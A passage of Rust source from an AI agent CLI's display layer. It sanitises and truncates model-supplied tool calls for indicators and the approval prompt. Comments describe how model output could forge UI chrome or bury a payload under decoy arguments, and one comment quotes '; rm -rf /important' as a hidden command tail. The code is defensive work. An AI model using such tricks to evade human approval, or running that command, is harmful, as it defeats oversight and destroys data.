    // sequences a sum would under-count instead. Taking the maximum shows less than might have fit,
    // which is the direction to be wrong in.
    unicode_width::UnicodeWidthStr::width(string).max(string.chars().map(char_width).sum())
}

/// Columns one character occupies, counting anything `unicode_width` will not score as zero.
///
/// `None` comes back for the control characters, which [`sanitize_to_line`] has already removed by
/// the time any budget is computed.
fn char_width(character: char) -> usize {
    unicode_width::UnicodeWidthChar::width(character).unwrap_or(0)
}

/// `[display].max_width`, or `None` to follow the terminal. Set once at startup.
static CONFIGURED_MAX_WIDTH: std::sync::OnceLock<Option<usize>> = std::sync::OnceLock::new();

/// Columns used when there is no terminal to measure. Fixed rather than guessed so a piped or
/// captured run produces the same bytes every time.
const FALLBACK_OUTPUT_WIDTH: usize = 100;

/// Narrowest width at which a line can be composed at all.
///
/// Not a legibility floor -- [`crate::config`] clamps a *configured* width to a much higher one for
/// that. This is arithmetic. Every budget here subtracts fixed chrome first, and the widest such
/// chrome is [`THINKING_PREFIX`]; below it the subtraction leaves nothing, and the promise the rest
/// of the file is built on -- that no composed line exceeds the width it was handed -- stops being
/// satisfiable at all. This leaves a few columns above that so each surface can still show a
/// truncation marker rather than only its own prefix.
///
/// A terminal this narrow wraps meka's chrome whatever the width says, so composing at the
/// narrowest width that still works costs nothing that was not already lost.
pub(crate) const MIN_OUTPUT_WIDTH: usize = 20;

/// Record the configured width. Called once from startup, before anything renders.
///
/// A second call is ignored rather than being an error: startup is the only caller, and a process
/// that somehow reached here twice wants the width it began with rather than a panic. Tests never
/// touch this -- every function that composes a line takes its width as an argument, which is why
/// they can.
pub fn set_max_width(configured: Option<usize>) {
    if CONFIGURED_MAX_WIDTH.set(configured).is_err() {
        tracing::debug!("max width already set; ignoring a second call");
    }
}

/// The widest line meka may compose from model output.
///
/// A configured width wins outright rather than being clamped to the terminal: pinning it is how
/// you get identical output across machines, and clamping would silently take that away on a narrow
/// one. The cost is that a value wider than the terminal wraps, which is the user's choice to make
/// and is documented at the setting.
///
/// Unset, this is the terminal's width, so nothing ever wraps. Gated on **stderr** because that is
/// where every caller writes; [`StreamingRenderer`] gates the same check on stdout because
/// assistant text goes there instead.
///
/// Both paths come back through [`resolve_output_width`], which is why every composition function
/// may state its width bound without an exception for absurd terminals.
pub(crate) fn output_width() -> usize {
    resolve_output_width(
        CONFIGURED_MAX_WIDTH.get().copied().flatten(),
        std::io::IsTerminal::is_terminal(&std::io::stderr())
            .then(|| termimad::terminal_size().0 as usize),
    )
}

/// The width arithmetic behind [`output_width`], with the two things it cannot test taken as
/// arguments: what was configured, and what the terminal measured (`None` when there is no terminal
/// to ask).
///
/// Split out because the floor is the precondition every other width bound in this file assumes,
/// and a precondition applied on only one of two paths is exactly the kind of gap that survives
/// review.
fn resolve_output_width(configured: Option<usize>, measured: Option<usize>) -> usize {
    configured
        .or_else(|| measured.filter(|width| *width > 0))
        .unwrap_or(FALLBACK_OUTPUT_WIDTH)
        .max(MIN_OUTPUT_WIDTH)
}

fn format_table(lines: &[String]) -> Vec<String> {
    if lines.is_empty() {
        return Vec::new();
    }

    let parsed: Vec<Vec<String>> = lines.iter().map(|line| parse_table_row(line)).collect();

    let column_count = parsed.iter().map(|row| row.len()).max().unwrap_or(0);
    if column_count == 0 {
        return lines.to_vec();
    }

    let mut column_widths = vec![0usize; column_count];
    for row in &parsed {
        if is_separator_row(row) {
            continue;
        }
        for (column_index, cell) in row.iter().enumerate() {
            if column_index < column_count {
                column_widths[column_index] = column_widths[column_index].max(display_width(cell));
            }
        }
    }

    // Ensure minimum width of 3 for separator dashes
    for width in &mut column_widths {
        *width = (*width).max(3);
    }

    let mut result = Vec::new();
    for row in &parsed {
        if is_separator_row(row) {
            let separator: Vec<String> = column_widths
                .iter()
                .map(|width| "-".repeat(*width))
                .collect();
            result.push(format!("| {} |", separator.join(" | ")));
        } else {
            let padded: Vec<String> = (0..column_count)
                .map(|column_index| {
                    let cell = row.get(column_index).map(|s| s.as_str()).unwrap_or("");
                    let padding = column_widths[column_index].saturating_sub(display_width(cell));
                    format!("{}{}", cell, " ".repeat(padding))
                })
                .collect();
            result.push(format!("| {} |", padded.join(" | ")));
        }
    }

    result
}

/// Columns a tab advances to. Four rather than eight because these lines already carry a block
/// indent, and eight pushes nested code past the width budget for no extra clarity.
const TAB_WIDTH: usize = 4;

/// Make a model-supplied string safe to place on one line of meka's own UI.
///
/// [`sanitize_for_display`] drops escapes and control characters but deliberately keeps `\n`, `\r`
/// and `\t`, which is right for text meant to span lines and wrong everywhere a string is being
/// slotted into a line meka composed. A kept `\n` walks out of an indented block and lands
/// attacker-chosen text at column 0; a kept `\r` returns the cursor and overwrites the label that
/// was supposed to introduce the value. Both forge meka's chrome without needing an escape
/// sequence, so every such site flattens them to spaces and caps the result.
///
/// A tab is expanded rather than flattened. It cannot move the cursor left or up, so it forges
/// nothing, and collapsing it to one space destroys the indentation of every tab-indented file the
/// block exists to let you read. Expanding also makes the width cap honest, since a tab otherwise
/// hides several columns behind a single character.
///
/// The cap is in terminal columns, not characters: a line of CJK or emoji is twice as wide as its
/// character count suggests, and a cap that misses that lets a "capped" line wrap into rows.
pub(crate) fn sanitize_to_line(text: &str, max_columns: usize) -> String {
    let flattened: String = sanitize_for_display(text)
        .chars()
        // Every character meka cannot measure is dropped, which `char::is_control` does not cover.
        // The rule is one line below -- a character worth zero columns does not survive -- and it is
        // deliberately wider than the classes that motivated it:
        //
        // `unicode_width` scores U+00AD SOFT HYPHEN and U+3164 HANGUL FILLER as zero columns while a
        // terminal following `wcwidth` draws one and two. A run of either passes any column budget
        // unmeasured, which is how a model pushes its own text onto a row meka believes is empty --
        // and the filler draws blank, so the overrun is invisible padding.
        //
        // A variation selector (U+FE00-FE0F) changes the width of the character *before* it, so a
        // budget measured before it is applied is wrong afterwards.
        //
        // This class also holds the bidi overrides, where the argument the user reads is not the
        // argument that runs.
        //
        // Dropping by measured width rather than by category costs the combining marks: a decomposed
        // `e` + U+0301 renders as `e`. Precomposed text, which is what NFC and almost every source
        // of these strings produces, is untouched. That is the same trade the ZWJ case already
        // makes, and it buys the property every budget here rests on -- that each surviving
        // character advances the count by at least one, so a cut is always reached.
        .flat_map(|character| match character {
            '\t' => std::iter::repeat_n(' ', TAB_WIDTH),
            character if character.is_whitespace() => std::iter::repeat_n(' ', 1),
            character => std::iter::repeat_n(character, 1),
        })
        // Applied after the whitespace above becomes spaces, so a newline still separates the words
        // it separated rather than being dropped as the zero-width character it measures as.
        .filter(|character| char_width(*character) > 0)
        .collect();
    truncate_to_width(&flattened, max_columns)
}

/// Marks a cut made by [`truncate_to_width`].
const TRUNCATION_MARKER: &str = "...";

/// Cut `text` to `max_columns` terminal columns, marking the cut.
///
/// Measured with [`display_width`] rather than `chars().count()`, because a "200 character"
/// argument of full-width characters occupies 400 columns and wraps into rows the cap exists to
/// prevent.
///
/// The marker is inside the budget, not added on top of it. Callers compose a line out of several
/// truncated parts against one total width, so a function that can return `max_columns + 3` makes
/// that total unenforceable. Below the marker's own width there is no room to say a cut happened,
/// so the text is simply cut.
fn truncate_to_width(text: &str, max_columns: usize) -> String {
    if display_width(text) <= max_columns {
        return text.to_string();
    }
    // A cut always says so, even when saying so is all there is room for. Emitting the text alone
    // when the budget cannot fit a marker produced a string that reads as complete: at 37 columns
    // `mcp__exa__web_search_exa` came out as `mc`, which is not a shortened name, it is a different
    // name.
    let marker = &TRUNCATION_MARKER[..TRUNCATION_MARKER.len().min(max_columns)];
    let budget = max_columns - display_width(marker);
    let mut kept = take_columns(text, budget);
    kept.push_str(marker);
    kept
}

/// The longest prefix of `text` that fits in `max_columns`.
///
/// Measured by re-measuring the whole prefix rather than by summing per-character widths, because
/// the two are not the same number and the callers gate on the former. `unicode_width` scores
/// `"1\u{fe0f}"` as two columns as a string and one as a sum, so a per-character fill packed twice
/// what the gate believed fit and every budget in the file came out at double. Re-measuring is
/// quadratic in the budget, which is bounded and small; being wrong is not.
fn take_columns(text: &str, max_columns: usize) -> String {
    let mut kept = String::new();
    for character in text.chars() {
        kept.push(character);
        if display_width(&kept) > max_columns {
            kept.pop();
            break;
        }
    }
    kept
}

/// Cut `text` to `max_columns`, keeping both ends.
///
/// For an *identifier*, where both ends carry meaning and the middle is filler. A tool name is
/// back-loaded: `mcp__exa__web_search_exa` and `mcp__exa__web_fetch_exa` agree for fifteen
/// characters and differ only at the end, so a tail cut throws away exactly what says which tool
/// ran. A path behaves the same way, and it is the commoner case:
/// `/home/you/projects/meka/docs/book/src/configuration/config-file.md` cut from the tail keeps
/// six directories and loses the filename, which is the part you were reading it for.
///
/// Use [`truncate_to_width`] for a *line of content* instead -- a line of source, a wrapped body --
/// where the text runs left to right and a hole in the middle would misrepresent it.
pub(crate) fn elide_to_width(text: &str, max_columns: usize) -> String {
    if display_width(text) <= max_columns {
        return text.to_string();
    }
    let marker_width = display_width(TRUNCATION_MARKER);
    // Too narrow to show both ends and say so; a tail cut at least stays readable.
    if max_columns <= marker_width + 2 {
        return truncate_to_width(text, max_columns);
    }
    let available = max_columns - marker_width;
    // The tail gets the larger half when the split is odd: it carries the operation in a tool name
    // and the filename in a path.
    let head_width = available / 2;
    let tail_width = available - head_width;
    format!(
        "{}{}{}",
        take_columns(text, head_width),
        TRUNCATION_MARKER,
        tail_columns(text, tail_width)
    )
}

/// The longest suffix of `text` that fits in `max_columns`, the mirror of [`take_columns`].
///
/// Measures the real suffix rather than reversing the string and taking a prefix, because width is
/// **not** order-independent and the reversed measurement is not the one that gets printed:
/// `display_width("\u{1F44D}\u{1F3FB}")` is 2 and `display_width("\u{1F3FB}\u{1F44D}")` is 4, so a
/// tail of skin-toned emoji measured backwards came back a third under its budget and the composed
/// line ran 100 columns wide where 80 was asked for.
///
/// [`display_width`] taking the larger of two measures also closes that case, since a per-character
/// sum does not care about order. This does not lean on it: measuring what is printed is correct
/// whatever the measure does next.
fn tail_columns(text: &str, max_columns: usize) -> String {
    let mut kept = "";
    for (index, _) in text.char_indices().rev() {
        let candidate = &text[index..];
        if display_width(candidate) > max_columns {
            break;
        }
        kept = candidate;
    }
    kept.to_string()
}

/// Columns a tool name may occupy before it is elided.
///
/// The name is served first because it is the part that identifies the call. A truncated argument
/// still conveys its gist (`Jane Street first mon...` is recognisably a search); a truncated name
/// frequently conveys nothing, since MCP names share long prefixes. The name is also mostly meka's
/// own text rather than the model's: built-ins come from [`tool_display_name`] and an MCP name is
/// normalised at registration. This bound exists for the remaining case, a hallucinated name, which
/// is unvalidated at render time and otherwise unbounded. No genuine name approaches it: built-ins
/// stop at 22 columns and `mcp__exa__web_search_exa` is 24.
const TOOL_NAME_MAX_WIDTH: usize = 64;

/// Below this many columns for the argument there is nothing worth showing, so the indicator drops
/// the parenthetical instead of printing an ellipsis in backticks.
const TOOL_ARGUMENT_FLOOR: usize = 8;

/// Fixed chrome in `[tool NAME(`ARG`)]`.
const TOOL_INDICATOR_CHROME: usize = "[tool (``)]".len();

/// Fixed chrome in `[tool NAME]`.
const TOOL_HEADER_CHROME: usize = "[tool ]".len();

/// The bare `[tool X]` line, with no argument.
///
/// The name is sanitised like any other model-supplied string. It arrives verbatim off the provider
/// stream, and while the registry is consulted just before the event is emitted, that lookup only
/// fetches the schema: a name matching nothing still reaches here. (An MCP tool's name is
/// separately normalised to `[A-Za-z0-9_-]` when its server is registered.)
fn tool_header(name: &str, width: usize) -> String {
    let display_name = sanitize_to_line(tool_display_name(name), usize::MAX);
    format!(
        "[tool {}]",
        elide_to_width(
            &display_name,
            TOOL_NAME_MAX_WIDTH.min(width.saturating_sub(TOOL_HEADER_CHROME))
        )
    )
}

/// Compose the "[tool X(`arg`)]" indicator line.
///
/// The agent loop computes `display_summary` (via [`resolve_primary_param`] over the tool's JSON
/// Schema) and passes it pre-resolved, so the frontend layer does not need the schema. See
/// `FrontendEvent::ToolCallStarted` in `crate::frontend`.
///
/// Replayed history has no schemas to resolve against and passes `None`, which is why the fallback
/// here exists: a built-in's primary parameter is known from its name alone, so a replayed
/// `read_file` shows the path it showed live instead of a bare `[tool ReadFile]`. An MCP tool
/// replayed from history does stay bare, which is the honest answer -- without its schema nothing
/// says which of its arguments is the one worth showing.
///
/// The whole line is budgeted, not each part, so adjacent indicators that had to be cut end at the
/// same column instead of wherever their own name happened to leave them. Within that budget the
/// name is served first and the argument takes what is left; when what is left is not worth
/// printing, the argument goes and the name stays whole.
fn tool_indicator_line(
    name: &str,
    input: &serde_json::Value,
    display_summary: Option<&str>,
    width: usize,
) -> String {
    let resolved = display_summary
        .map(str::to_string)
        .or_else(|| resolve_primary_param(name, input, None));
    let Some(value) = resolved
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    else {
        return tool_header(name, width);
    };

    let available = width.saturating_sub(TOOL_INDICATOR_CHROME);
    // Sanitise before measuring, then truncate: the display width of the raw name is not the width
    // of what gets printed once escapes and format characters are gone.
    let display_name = sanitize_to_line(tool_display_name(name), usize::MAX);
    let display_name = elide_to_width(&display_name, TOOL_NAME_MAX_WIDTH.min(available));
    let argument_budget = available.saturating_sub(display_width(&display_name));
    if argument_budget < TOOL_ARGUMENT_FLOOR {
        return tool_header(name, width);
    }
    format!(
        "[tool {}(`{}`)]",
        display_name,
        // Elided from the middle, not the tail: the primary parameter is an identifier -- a path,
        // a URL, a command -- and its end carries the filename or the destination.
        elide_to_width(&sanitize_to_line(value, usize::MAX), argument_budget)
    )
}

/// One level of nesting in a [`ToolParams::Full`] block.
const TOOL_PARAM_INDENT: &str = "  ";

/// Columns a value keeps however long its key is, mirroring [`TOOL_NAME_MAX_WIDTH`]'s reasoning in
/// the other direction: here the key is the label and the value is the substance.
const TOOL_VALUE_MIN_WIDTH: usize = 16;

/// How much of a call an argument block may show.
///
/// The same renderer serves two audiences with opposite needs. A tool indicator is a notification
/// scrolling past, so it may trade completeness for brevity. An approval prompt is a decision, so
/// it may not: what it hides is what you authorise unseen.
#[derive(Debug, Clone, Copy)]
struct BlockLimits {
    /// Source lines shown under one argument's key before the rest is summarised as a count.
    ///
    /// Counted in the value's own lines, so the `... N more lines` marker means what it says.
    /// Capping rendered *rows* and reporting those as lines tells the reader of a 100-line file
    /// that 108 lines were hidden.
    lines_per_argument: usize,
    /// Rows one argument may occupy, however many lines or elements are under its key.
    ///
    /// [`lines_per_argument`](Self::lines_per_argument) does not bound this on its own. A
    /// container has no lines to count and fans out one row per element; a wrapped string
    /// turns one line into several. Without a separate bound the two caps composed by addition
    /// and an argument could spend the whole block's budget by itself.
    rows_per_argument: usize,
    /// Rows the block may already hold before the remaining arguments are dropped and named.
    ///
    /// Checked before an argument is rendered, never in the middle of one, so a block reaches at
    /// most this plus [`rows_per_argument`](Self::rows_per_argument) plus the line that names what
    /// went. That sum is the real ceiling, and it is the number the docs quote.
    ///
    /// Both audiences need a ceiling: "show everything" with none lets two hundred decoy arguments
    /// push the real one off the top, which is the same outcome dropping was supposed to be worse
    /// than, minus the marker that would have warned anybody.
    block_rows: usize,
    /// Wrap a too-wide line onto the next row instead of cutting it.
    wrap: bool,
}

impl BlockLimits {
    /// For `[display].tool_params = "full"`. A `write_file` carrying a whole source file has to be
    /// readable as "this happened" without evicting the turn from scrollback; the untruncated text
    /// is what `meka session export` is for.
    ///
    /// Worst case 93 rows: 59 already there, 33 for the argument that crossed the line, one naming
    /// the rest.
    fn indicator() -> Self {
        Self {
            lines_per_argument: 30,
            // One over `lines_per_argument`, plus the key line: enough that a string value capped
            // by its own line budget is never cut again by this one, and its `... N
            // more lines` marker survives to be read.
            rows_per_argument: 32,
            block_rows: 60,
            wrap: false,
        }
    }

    /// For the `ask` approval prompt.
    ///
    /// Wrapping rather than cutting, since cutting a line hides the tail of the command being
    /// approved. Twenty lines rather than thirty because a prompt blocks reading and wants to be
    /// short.
    ///
    /// The block ceiling is generous but real, and worth 161 rows in the worst case. Dropping an
    /// argument from a decision is bad, and it was tempting to allow none; but leaving the block
    /// unbounded lets two hundred decoy arguments scroll the real tool name and the real payload
    /// off the top, which is the same outcome with no marker to warn anybody. A named drop is
    /// the lesser harm, and it is the signal to deny.
    fn approval() -> Self {
        Self {
            lines_per_argument: 20,
            // Three times the line budget, so wrapping has room to be worth having: a single-line
            // `execute_command` -- the commonest approval there is -- gets all sixty rows to
            // itself.
            rows_per_argument: 60,
            block_rows: 100,
            wrap: true,
        }
    }
}

/// A width and the limits to render within it. They always travel together, so the `push_*` helpers
/// take one value rather than two parameters.
#[derive(Debug, Clone, Copy)]
struct BlockContext {
    width: usize,
    limits: BlockLimits,
}

/// Break `text` into at most `max_rows` rows of at most `max_columns`, preferring a space.
///
/// For the approval prompt, where cutting a line hides the tail of what is being authorised. The
/// caller prefixes every row with the block indent, so no row begins at column zero even though the
/// value now spans several.
///
/// **When it does not fit, the last two rows are a count and the END of the text**, not wherever
/// the budget ran out. This is [`elide_to_width`]'s reasoning one dimension up. Wrapping was chosen
/// over cutting so the tail of a command could not be hidden from the line being approved, and a
/// wrap that shows the first `max_rows` rows and stops hides exactly that: a 90 KB
/// `execute_command` filled every row it was given and left `; rm -rf /important` off the end of
/// the last one. The notification surface, which elides from the middle, showed that tail; the
/// decision surface did not.
fn wrap_to_width(text: &str, max_columns: usize, max_rows: usize) -> Vec<String> {
    // A zero budget can show nothing. Returning the text would be worse than showing none of it:
    // the caller has already spent the width on indent, and an unbounded row of model output is the
    // one thing the budget exists to prevent.
    if max_columns == 0 || max_rows == 0 {
        return Vec::new();
    }
    if display_width(text) <= max_columns {
        return vec![text.to_string()];
    }
    // Continuation rows keep the line's own leading whitespace, so wrapped code still reads at the
    // depth it was written at instead of appearing to dedent.
    let hanging = &text[..text.len() - text.trim_start_matches(' ').len()];
    let hanging = take_columns(hanging, max_columns / 2);
    // Two rows held back for the count and the end. Below three rows there is no room for that
    // shape, so the whole budget goes to the head and the last row is cut where it lands.
    let keeps_the_end = max_rows >= 3;
    let head_rows = if keeps_the_end {
        max_rows - 2
    } else {
        max_rows
    };
    let mut rows: Vec<String> = Vec::new();
    let mut rest = text;
    while rows.len() < head_rows {
        let prefix = if rows.is_empty() {
            ""
        } else {
            hanging.as_str()
        };
        let budget = max_columns.saturating_sub(display_width(prefix));
        if budget == 0 || display_width(rest) <= budget {
            break;
        }
        let head = take_columns(rest, budget);
        if head.is_empty() {
            // One character is wider than the whole budget, so no row can hold it. Taking it anyway
            // was the way out of the loop and it overflowed the width by that character; falling
            // through to the truncation below emits a marker, which fits any budget at all.
            break;
        }
        // Break at the last space that fits, but never inside a leading run of them: breaking there
        // emits a row that is empty once trimmed and silently drops the line's indentation.
        let split = match head.rfind(' ') {
            Some(index) if !head[..index].trim().is_empty() => index,
            _ => head.len(),
        };
        rows.push(format!("{}{}", prefix, rest[..split].trim_end()));
        rest = rest[split..].trim_start_matches(' ');
        if rest.is_empty() {
            return rows;
        }
    }
    let prefix = if rows.is_empty() {
        ""
    } else {
        hanging.as_str()
    };
    let budget = max_columns.saturating_sub(display_width(prefix));
    if keeps_the_end && budget > 0 && display_width(rest) > budget {
        let tail = tail_columns(rest, budget);
        let dropped = rest.chars().count() - tail.chars().count();
        rows.push(format!(
            "{}{}",
            prefix,
            truncate_to_width(&format!("... {} more characters ...", dropped), budget)
        ));
        rows.push(format!("{}{}", prefix, tail));
        return rows;
    }
    rows.push(format!("{}{}", prefix, truncate_to_width(rest, budget)));
    rows
}

/// Render a tool call's whole input as an indented block, one line per element.
///
/// Deliberately not JSON. Quoting every key and escaping every newline turns the two tools whose
/// arguments most need reading (`edit_file`, `write_file`) into a single unreadable line, which is
/// the opposite of what asking for full parameters means. So: a value that fits on a line follows
/// its key, a value that does not gets an indented block under a bare `key:`, and nesting is
/// carried by indentation with `-` for array elements. The cost is that the string/number
/// distinction is gone, which is why the exact JSON stays available through `meka session export`.
fn render_tool_params(input: &serde_json::Value, width: usize, limits: BlockLimits) -> Vec<String> {
    let context = BlockContext { width, limits };
    let serde_json::Value::Object(fields) = input else {
        // A tool whose input is not an object at all. Nothing sensible to key it by, so it renders
        // as a bare value rather than being dropped, which would read as "no arguments".
        let mut lines = Vec::new();
        match input {
            serde_json::Value::Array(items) => {
                for item in items {
                    push_item(&mut lines, 1, item, context);
                }
            }
            other => push_value_body(&mut lines, 1, other, context),
        }
        // There is no key here to hang a per-argument cap on, and the block ceiling below is only
        // reached through the object path, so without this an array input printed every element it
        // had.
        cap_rows(&mut lines, limits.block_rows, TOOL_PARAM_INDENT, width);
        return lines;
    };

    let mut lines = Vec::new();
    let mut omitted: Vec<String> = Vec::new();
    for (key, value) in fields {
        // Whole arguments are dropped at their own boundary rather than the block being cut
        // wherever the last row happens to land. Cutting mid-argument loses that argument's own
        // elision marker, and reports a count that bears no relation to how much was hidden.
        // Dropping by argument lets the block say what is missing by name, which is what a reader
        // needs: `path` disappearing entirely is worse than any amount of `content` being trimmed.
        if !omitted.is_empty() || lines.len() >= limits.block_rows {
            omitted.push(sanitize_to_line(key, width));
            continue;
        }
        let mut param = Vec::new();
        push_param(&mut param, 1, key, value, context);
        // `lines_per_argument` bounds a *string* value, counted in its own lines by
        // `push_value_body`. A container has no lines to count: it fans out one row per element and
        // needs a row bound of its own, or a single array argument outruns the block on its own.
        // The key line is never cut -- an argument whose name you can read, trimmed, beats one that
        // vanished -- so the ceiling applies to what hangs off it.
        cap_rows(
            &mut param,
            limits.rows_per_argument,
            &TOOL_PARAM_INDENT.repeat(2),
            width,
        );
        lines.append(&mut param);
    }
    if !omitted.is_empty() {
        // Budgeted as one string. Cutting only the names left the count and the words around it
        // unmeasured, and `  ... 240 more arguments: ` is twenty-six columns before a single name
        // is added, so at the narrow end this line alone broke the width every other line
        // here keeps.
        lines.push(truncate_to_width(
            &format!(
                "{}... {} more argument{}: {}",
                TOOL_PARAM_INDENT,
                omitted.len(),
                if omitted.len() == 1 { "" } else { "s" },
                omitted.join(", ")
            ),
            width,
        ));
    }
    lines
}

/// Cut `lines` to `max_rows`, saying how many rows went and **keeping the last one**.
///
/// Counted in rows rather than in the value's source lines, and the wording follows: this is the
/// bound that keeps the block on the screen, and after wrapping a source line is not a row.
///
/// Keeping the last row is the same rule [`wrap_to_width`] and [`elide_to_width`] follow, for the
/// same reason: what a reader most needs from a thing too big to show is its beginning and its end.
/// Plain truncation also deleted whatever marker the row below had carried -- an argument that had
/// already reported `... 480 more lines` lost that line to this cut, so the block ended up
/// admitting to two dropped rows and nothing else.
fn cap_rows(lines: &mut Vec<String>, max_rows: usize, indent: &str, width: usize) {
    if lines.len() <= max_rows || max_rows < 2 {
        lines.truncate(lines.len().min(max_rows));
        return;
    }
    let Some(last) = lines.last().cloned() else {
        return;
    };
    // The marker and the kept row are two of the `max_rows`, so the head keeps the rest.
    let elided = lines.len() - (max_rows - 1);
    lines.truncate(max_rows - 2);
    lines.push(format!(
        "{}{}",
        indent,
        truncate_to_width(
            &format!(
                "... {} more row{}",
                elided,
                if elided == 1 { "" } else { "s" }
            ),
            width.saturating_sub(display_width(indent))
        )
    ));
    lines.push(last);
}

/// Append one `key: value` pair at `depth`, recursing for containers.
fn push_param(
    lines: &mut Vec<String>,
    depth: usize,
    key: &str,
    value: &serde_json::Value,
    context: BlockContext,
) {
    let indent = block_indent(depth, context.width);
    let available = context.width.saturating_sub(display_width(&indent));
    // A key is model-supplied too: an MCP tool's arguments are whatever the model generated, and
    // nothing checks them against the schema before they are rendered. Its budget reserves room for
    // the value, for the reason on `TOOL_VALUE_MIN_WIDTH`.
    // Floored: a key cut to nothing renders as a bare `:` with no sign anything was there, which
    // is worse than a short name. `truncate_to_width` marks whatever it cuts.
    let key = sanitize_to_line(
        key,
        available
            .saturating_sub(TOOL_VALUE_MIN_WIDTH + ": ".len())
            .max(TRUNCATION_MARKER.len() + 1),
    );
    match value {
        serde_json::Value::Object(fields) if !fields.is_empty() => {
            lines.push(format!("{}{}:", indent, key));
            for (nested_key, nested) in fields {
                push_param(lines, depth + 1, nested_key, nested, context);
            }
        }
        serde_json::Value::Array(items) if !items.is_empty() => {
            lines.push(format!("{}{}:", indent, key));
            for item in items {
                push_item(lines, depth + 1, item, context);
            }
        }
        serde_json::Value::String(text) if is_multi_line(text) => {
            lines.push(format!("{}{}:", indent, key));
            push_value_body(lines, depth + 1, value, context);
        }
        _ => {
            let value_budget = available.saturating_sub(display_width(&key) + ": ".len());
            // When wrapping, a value too wide for the key line gets a block of its own rather than
            // being cut on it. Otherwise the commonest approval of all -- a long `execute_command`
            // pipeline, which is one line and so never reached `push_value_body` -- would have its
            // tail hidden, which is the whole failure this mode exists to avoid.
            // `wrap` first: rendering the value at full width to measure it is a whole
            // sanitisation pass over a megabyte-sized argument, and the indicator never uses it.
            if context.limits.wrap && display_width(&scalar_text(value, usize::MAX)) > value_budget
            {
                lines.push(format!("{}{}:", indent, key));
                push_value_body(lines, depth + 1, value, context);
            } else {
                lines.push(format!(
                    "{}{}: {}",
                    indent,
                    key,
                    scalar_text(value, value_budget)
                ));
            }
        }
    }
}

/// Whether a string needs a block of its own rather than a spot on the key line.
///
/// Only `\n` counts, matching [`str::lines`], which is what splits the block. A stray `\r` is a
/// cursor movement rather than a line break and is flattened by [`sanitize_to_line`] instead;
/// treating it as a break here would turn a one-line value into a two-line block.
///
/// A trailing newline does not count either. A `write_file` body almost always ends with one, and
/// counting it turned a one-line value into a bare `key:` followed by a single indented line.
fn is_multi_line(text: &str) -> bool {
    text.trim_end_matches('\n').contains('\n')
}

/// Append one array element at `depth`, bulleted with `-`.
///
/// An element that is itself an object puts its first field on the bullet line and aligns the rest
/// under it, so a list of records reads as records rather than as a run of bullets.
fn push_item(
    lines: &mut Vec<String>,
    depth: usize,
    item: &serde_json::Value,
    context: BlockContext,
) {
    // Bounded like every other indent in the block. An array nests through this function rather
    // than through `push_param`, so leaving it proportional to depth put a bullet at column 40
    // of a 40-column line and pushed everything under it past the edge.
    let indent = block_indent(depth, context.width);
    match item {
        serde_json::Value::Object(fields) if !fields.is_empty() => {
            let nested_indent = block_indent(depth + 1, context.width);
            // The bullet replaces exactly the one indent level that `depth + 1` added, so the field
            // lands where it would have without the bullet and its siblings stay aligned with it.
            // Past the indent ceiling there is no such level: `depth + 1` indents no further, the
            // field was budgeted against that same indent, and hoisting it would widen its line by
            // the bullet. So the bullet takes a row of its own there, as the arms below already do.
            let hoisted = nested_indent.len() > indent.len();
            if !hoisted {
                lines.push(format!("{}-", indent));
            }
            let first = lines.len();
            for (key, value) in fields {
                push_param(lines, depth + 1, key, value, context);
            }
            if hoisted && let Some(line) = lines.get_mut(first) {
                let body = line
                    .strip_prefix(&nested_indent)
                    .unwrap_or(line)
                    .to_string();
                *line = format!("{}- {}", indent, body);
            }
        }
        serde_json::Value::Array(nested) if !nested.is_empty() => {
            lines.push(format!("{}-", indent));
            for value in nested {
                push_item(lines, depth + 1, value, context);
            }
        }
        // Mirrors `push_param`'s multi-line arm. Without it a bulleted string kept its newlines and
        // put every line after the first at column 0, which is both wrong to read and enough to
        // forge a `[tool ...]` header outside the block.
        serde_json::Value::String(text) if is_multi_line(text) => {
            lines.push(format!("{}-", indent));
            push_value_body(lines, depth + 1, item, context);
        }
        _ => {
            let budget = context
                .width
                .saturating_sub(display_width(&indent) + "- ".len());
            // Same promotion `push_param` makes: under wrapping, a value too wide for its own row
            // gets a block rather than losing its tail. An MCP tool taking `["bash", "-lc", "<long
            // command>"]` is the shape this exists for, and ask mode gates MCP tools.
            if context.limits.wrap && display_width(&scalar_text(item, usize::MAX)) > budget {
                lines.push(format!("{}-", indent));
                push_value_body(lines, depth + 1, item, context);
            } else {
                lines.push(format!("{}- {}", indent, scalar_text(item, budget)));
            }
        }
    }
}

/// Append a value with no key of its own: the body of a multi-line string, or a non-object input.
fn push_value_body(
    lines: &mut Vec<String>,
    depth: usize,
    value: &serde_json::Value,
    context: BlockContext,
) {
    let indent = block_indent(depth, context.width);
    let budget = context.width.saturating_sub(display_width(&indent));
    let text = match value {
        serde_json::Value::String(text) => text.clone(),
        other => scalar_text(other, budget),
    };
    // Capped in the value's own lines, so the marker below counts what a reader would count.
    let source_lines: Vec<&str> = text.lines().collect();
    let shown = source_lines.len().min(context.limits.lines_per_argument);
    // Rows are the other budget, and it has to be shared out here rather than left to the cap
    // downstream. Handing every line the whole argument's budget let twenty lines claim twenty
    // times it; the cap then cut the excess and, with it, this function's own `... N more
    // lines` marker, so the block reported two dropped rows where a thousand had gone. One row
    // is held back for that marker.
    let rows_per_line = context
        .limits
        .rows_per_argument
        .saturating_sub(1)
        .checked_div(shown.max(1))
        .unwrap_or(1)
        .max(1);
    for line in &source_lines[..shown] {
        // `str::lines` splits on `\n` and strips a trailing `\r`, but a lone `\r` mid-line survives
        // it; `sanitize_to_line` is what stops that returning the cursor over the indent. Flattened
        // first either way, so wrapping only ever breaks text meka is choosing to spread over rows
        // and a `\n` from the model never reaches the terminal.
        let flattened = sanitize_to_line(line, usize::MAX);
        if context.limits.wrap {
            for row in wrap_to_width(&flattened, budget, rows_per_line) {
                lines.push(format!("{}{}", indent, row));
            }
        } else {
            lines.push(format!(
                "{}{}",
                indent,
                truncate_to_width(&flattened, budget)
            ));
        }
    }
    let elided = source_lines.len() - shown;
    if elided > 0 {
        lines.push(format!(
            "{}{}",
            indent,
            truncate_to_width(
                &format!(
                    "... {} more line{}",
                    elided,
                    if elided == 1 { "" } else { "s" }
                ),
                budget
            )
        ));
    }
}

/// The indent for a block at `depth`, bounded so it can never consume the whole width.
///
/// Nesting is unbounded up to serde_json's parse limit, so an indent proportional to depth reaches
/// the width and leaves a zero budget, at which point keys render as bare `:` and values escape
/// their cap entirely. Past the ceiling the block stops indenting rather than stops informing.
fn block_indent(depth: usize, width: usize) -> String {
    let max_depth = (width / 2) / TOOL_PARAM_INDENT.len();
